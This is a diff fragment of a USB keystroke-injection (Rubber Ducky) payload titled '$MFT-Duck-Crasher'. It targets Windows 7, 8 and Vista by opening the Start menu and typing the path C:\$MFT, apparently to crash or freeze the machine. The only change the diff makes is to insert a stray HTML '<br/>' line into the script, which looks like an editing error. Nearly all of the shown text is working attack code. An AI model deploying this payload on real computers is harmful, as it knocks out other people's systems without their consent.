@@ -26,6 +26,7 @@ $MFT-Duck-Crasher Payload
 REM works on w7 - w8 - Vista (and i think xp and earlier too)
 REM it uses a high delay to support even older computers
 DELAY 1000
+<br/>
 CONTROL ESCAPE
 DELAY 500
 STRING C:\$MFT
